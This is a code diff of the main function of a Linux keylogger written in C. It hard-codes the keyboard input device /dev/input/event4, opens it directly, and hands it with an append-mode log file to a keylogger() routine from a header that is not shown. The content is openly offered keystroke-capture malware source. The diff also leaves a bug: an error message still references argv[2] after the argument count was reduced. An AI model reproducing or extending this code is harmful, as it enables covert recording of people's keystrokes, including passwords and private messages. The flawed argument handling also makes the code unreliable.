@@ -1,24 +1,30 @@
 #include <stdio.h>
 #include <string.h>
 #include <errno.h>
+#include <fcntl.h>
+#include "keylogger.h"
 
 int main(int argc, char *argv[]){
-    FILE *readin;
+    const char KEYBOARD_DEVICE[] = "/dev/input/event4";
     FILE *writeout;
+    int keyboard;
 
-    if(argc != 3){
-        printf("Usage: %s [KEYBOARD-FILE] [WRITEOUT-FILE]", argv[0]);
+    if(argc != 2){
+        printf("Usage: %s [WRITEOUT-FILE]\n", argv[0]);
         return 1;
     }
 
-    if((readin = fopen(argv[1], "r")) == NULL){
-        printf("Error opening file %s: %s\n", argv[1], strerror(errno));
+
+    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
+        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
         return 1;
     }
-    if((writeout = fopen(argv[2], "a")) == NULL){
+    if((writeout = fopen(argv[1], "a")) == NULL){
         printf("Error opening file %s: %s\n", argv[2], strerror(errno));
         return 1;
     }
-    
 
+    keylogger(keyboard, writeout);
+
+    return 0;
 }
